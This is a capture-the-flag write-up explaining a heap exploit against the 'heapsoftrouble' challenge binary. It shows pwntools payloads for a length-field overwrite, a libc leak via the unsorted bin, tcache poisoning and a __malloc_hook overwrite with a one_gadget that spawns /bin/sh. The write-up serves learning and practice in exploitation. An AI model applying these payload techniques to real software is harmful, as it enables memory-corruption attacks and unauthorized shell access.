# Matrix Management System 'heapsoftrouble' Writeup 

This challenge provides a menu with a selection of options, a somewhat common pattern in heap challenges.

This is the most difficult pwn challenge, so this writeup will not cover memory corruption basics or details about how to reverse engineer it. The binary is not stripped, which makes understanding it a little easier. 

The overline of the solve is:
 - Create a chunk in the small bin so that the libc address is on the heap
 - Increase name length with blind overwrite
 - Use increased name length to leak heap addresses and libc address.
 - Use heap leak+overwrite to gain arbitrary write: corrupt a tcache chunk.
 - Use libc write to overwrite `__malloc_hook` with a onegadget

When reversing the binary, one of the first things we notice is a function called 'silentOverflow' that a secret input of '7' will call. That function allocates a new object on the heap, and writes up to 80 characters to it.

The other choices are:
 1 - create: Create a new matrix with a specific name and population.
 2 - delete: Delete a matrix by freeing it's name, then it's address.
 3 - configure: Change the population of a matrix
 4 - printMatrix: Prints a matrix's name, population, and power output. It uses the length field to determine how many bytes of the name to print.
 5 - printAllMatrixes: Loops through all matrixes and calls printMatrix on each non-null one.
 6 - exit: calls exit()

The bug in this program is relatively obvious: `silentOverflow`, but exploitation is not as simple. We will need to first use the overflow to leak libc, then we will need to find a way to gain code execution, probably by writing to `__malloc_hook`.

When we start up the program, it asks for a name. Any name that is not `Neo` will get us past this check.

In order to get a leak, we can start by attempting to overwrite the `length` field of an existing matrix. To do that, we need to overflow into some buffer before the matrix we wish to overwrite. If we free (or delete) a matrix, we can overflow into the next matrix, if we can get the freed chunk allocated with silentOverflow.

When creating a matrix, the name is allocated first, then the matrix is allocated. This means that the chunk at the former name of a previous matrix will be the closest to the next matrix, making an overflow easier. Since the name is freed first, then the matrix, after deleting 'Matrix #4', the memory layout and freelist will look something like:

```
0x1 Matrix #4
0x2 Matrix #4 Name
0x3 Matrix #5
0x4 Matrix #5 Name

free(0x2: Matrix #4 Name)
free(0x1: Matrix #4)

0x1 -> 0x2 -> Other free chunks
```

This means that we need to allocate one chunk before we can overflow into Matrix #5. To do that, we can just call `silentOverflow` with a non-overflowing short input.

```
deleteMatrix(b'Matrix #4')
silentOverflow(b'A')
silentOverflow(b'A\x00' + b'A' * 46 + p64(population) + p64(poweroutput) + b'\x00\x00')
```

We can determine the offset using pwntools.cyclic, breaking after silentOverflow, and using gef's `heap bins` command to determine the offset of the chunk. This writeup will not go into details into specifics for offset calculation.

The matrix struct is as follows:
```c
struct matrix {
    long int population;
    long int poweroutput;
    int namelen;
    char * name;
};
```

Noteably, a new line will always be written at the end of silentOverflow. the above input to silentOverflow will overflow '\x00\x00\x0a' into the size, which will set the size to 0xa0000 or 655360, which will dump a ton of the heap.

Next, we need to ensure that a libc address is somewhere on the heap when we leak it. Interestingly, the first small bin allocated will contain a pointer to a location in libc. The problem is that smallbins need to be larger than the fastbin sizes, and a size that large is never directly allocated by this program, and the tcache must be full before a smallbin will even be allocated. The first problem is resolved by `getline`. That function, given a larger input, will allocate a larger size if needed. The second problem can be resolved if we can free a chunk without it being reallocated.

There is a way to do this. If we create a matrix, with a name of a long enough length name (0x80), the size of the chunk for the name will be increased by getline. Then when it is freed, it will be added to a tcache bin. It turns out, that since `name` is already allocated with a smaller size, even when its length is increased with `getline`, it will not use the larger freed chunk.
```c
char * name = malloc(buffsize);
int len = getline(&name, &buffsize, stdin);
```

We can demonstrate this in GEF by repeatedly creating and deleting a matrix with a long name, or even just searching for a matrix with a long name. Each tcache bin can hold up to 7 chunks, so we must create and free the matrix 8 times, with code like the following:
```python
deleteMatrix(b'Matrix #1')  # Delete a matrix, so that we can create a new one in its spot
for i in range(8):
    createMatrix(b'A' * 0x80, b'1')
    deleteMatrix(b'A' * 0x80)
```

If we break after the loop in gdb, and print the freelists, we get:
```
gef➤  heap bins
───────────────────────────────────── Tcachebins for arena 0x7ff4f34709e0 ─────────────────────────────────────
Tcachebins[idx=1, size=0x30] count=3  ←  Chunk(addr=0x5602f0348310, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x5602f0348340, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x5602f03488b0, size=0x30, flags=PREV_INUSE) 
Tcachebins[idx=7, size=0x90] count=7  ←  Chunk(addr=0x5602f0348cd0, size=0x90, flags=)  ←  Chunk(addr=0x5602f0348b20, size=0x90, flags=PREV_INUSE)  ←  Chunk(addr=0x5602f0348bb0, size=0x90, flags=PREV_INUSE)  ←  Chunk(addr=0x5602f0348a00, size=0x90, flags=PREV_INUSE)  ←  Chunk(addr=0x5602f0348a90, size=0x90, flags=PREV_INUSE)  ←  Chunk(addr=0x5602f03488e0, size=0x90, flags=PREV_INUSE)  ←  Chunk(addr=0x5602f0348970, size=0x90, flags=PREV_INUSE)
────────────────────────────────────── Fastbins for arena 0x7ff4f34709e0 ──────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────────────── Unsorted Bin for arena 'main_arena' ─────────────────────────────────────
[+] unsorted_bins[0]: fw=0x5602f0348c30, bk=0x5602f0348c30
 →   Chunk(addr=0x5602f0348c40, size=0x90, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
────────────────────────────────────── Small Bins for arena 'main_arena' ──────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────────────── Large Bins for arena 'main_arena' ──────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

`Tcachebins[idx=7]` has been filled, since its count is `7`. The chunk that gef believes is in `unsorted_bins` is what we want to leak - it should have a libc address in it. We can check this with GEF:
```
gef➤  heap chunk 0x5602f0348c40
Chunk(addr=0x5602f0348c40, size=0x90, flags=PREV_INUSE)
Chunk size: 144 (0x90)
Usable size: 136 (0x88)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: On
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off

Forward pointer: 0x7ff4f3470a40
Backward pointer: 0x7ff4f3470a40
```

Its forward and backwards pointers do point to an address within libc, as expected.

If we use our previously discovered leak after setting up the heap like this, we now have access to libc. Specific offset calculation will not be discussed here, but using `info proc mappings` in gdb can be helpful to see where libc loaded is in memory.

Next up, we need to gain the ability to write a onegadget to `__malloc_hook`, which is a function pointer that will be called every time `malloc` is called.

Since the tcache does not have strict protections, we should be able to overflow into the `fd` pointer of a free tcache chunk, write an address we want to write to there, and allocate that chunk, and our fake chunk, gaining the ability to write to an arbitrary address.

```python
deleteMatrix("Matrix #7")  # free(matrix7name); free(matrix7)
# Overflow from the previous address of Matrix #7 into the now free address of Matrix #7's name.
silentOverflow(b'A\x00' + b'A' * 38 + p64(0x31) + p64(targetAddr)) # 0x31 is the size/prev in use bit of the corrupted chunk
```

Then we can allocate our corrupted chunk, and the next allocated chunk will be at the target address (`__malloc_hook` in this case):
```
silentOverflow(b'A')
silentOverflow(b'A\x00' + p64(onegadget))
```

The target address is actually two bytes before `__malloc_hook`, because `silentOverflow` writes a null byte right before the last null byte in the input. This way, we can start the input with `b'A\x00'`, and not corrupt the address of the one gadget.

Finding the one gadget is relatively straightforward:
```
━━┫ one_gadget heapsoftrouble.libc         
0xc751a execve("/bin/sh", r13, r12)
constraints:
  [r13] == NULL || r13 == NULL
  [r12] == NULL || r12 == NULL

0xc751d execve("/bin/sh", r13, rdx)
constraints:
  [r13] == NULL || r13 == NULL
  [rdx] == NULL || rdx == NULL

0xc7520 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

Finally, we can call something that will call malloc, assuming that we can meet the constraints on our onegadget. In our case after trying a few gadgets and options, I settled on the gadget at `0xc751d`, with the next option chosen '4' or printMatrix.

See `solve.py` for a full and correct implementation of the solution.
